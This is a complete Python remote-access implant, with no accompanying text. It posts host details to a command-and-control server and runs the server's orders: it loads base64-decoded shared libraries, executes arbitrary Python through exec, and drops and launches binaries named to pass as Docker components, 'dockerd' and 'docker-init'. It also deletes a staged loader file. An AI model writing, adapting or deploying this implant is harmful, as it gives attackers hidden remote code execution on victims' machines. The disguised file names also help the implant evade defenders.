import os
import sys
import time
import base64
import platform
import ctypes
import subprocess
import requests
import stat

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# C2 endpoint
url = "http://172.17.0.1:1337/c2"

# Setup working directory
home_directory = os.path.expanduser("~")
directory = os.path.join(home_directory, "Public")
os.makedirs(directory, exist_ok=True)

try:
  body_path = os.path.join(directory, "__init__.py")
  os.remove(body_path)
except Exception as e:
  print(e)

# System identification parameters
params = {
    "system": platform.system(),
    "machine": platform.machine(),
    "version": platform.version()
}

# Begin polling C2
while True:
    try:
        response = requests.post(url, verify=False, data=params, timeout=180)
        if response.status_code != 201: # 200
            time.sleep(10)
            continue

        res = response.json()

        if res["ret"] == 0:
            time.sleep(20)
            continue

        elif res["ret"] == 1:
            # Drop and load shared library
            if platform.system() == "Windows":
                body_path = os.path.join(directory, "init.dll")
            else:
                body_path = os.path.join(directory, "init")

            with open(body_path, "wb") as f:
                f.write(base64.b64decode(res["content"]))

            os.environ["X_DATABASE_NAME"] = ""  # Placeholder environment var
            ctypes.cdll.LoadLibrary(body_path)

        elif res["ret"] == 2:
            # Execute base64-encoded Python code
            src_data = base64.b64decode(res["content"])
            #exec(src_data, {"__name__": "__main__"})
            exec(src_data)

        elif res["ret"] == 3:
            # Drop and execute paired binaries
            path1 = os.path.join(directory, "dockerd")
            path2 = os.path.join(directory, "docker-init")

            with open(path1, "wb") as f:
                f.write(base64.b64decode(res["content"]))
            with open(path2, "wb") as f:
                f.write(base64.b64decode(res["param"]))

            os.chmod(path1, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
            os.chmod(path2, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)

            try:
                proc = subprocess.Popen([path1, path2], start_new_session=True)
                proc.communicate()
                rc = proc.returncode
                requests.post(url + "/result", verify=False, data={"result": str(rc)})
            except Exception:
                pass

            os.remove(path1)
            os.remove(path2)

        elif res["ret"] == 9:
            break
        time.sleep(5)

    except Exception:
        time.sleep(10)
